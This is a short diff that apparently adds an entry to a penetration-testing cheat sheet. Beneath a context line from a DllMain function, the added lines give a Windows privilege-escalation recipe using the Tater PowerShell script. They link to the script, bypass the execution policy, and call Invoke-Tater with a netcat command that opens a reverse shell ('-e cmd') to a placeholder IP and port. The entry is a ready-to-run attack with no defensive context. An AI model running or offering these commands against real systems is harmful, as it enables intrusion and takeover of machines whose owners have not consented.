@@ -633,3 +633,11 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 }
 
 ```
+
+### [Privesc using tater]
+https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1
+```
+1. powershell -nop -exec bypass
+2. Import-Module .\Tater.ps1
+3. Invoke-Tater -Trigger 1 -Command "nc <IP> <PORT> -e 'cmd'"
+```
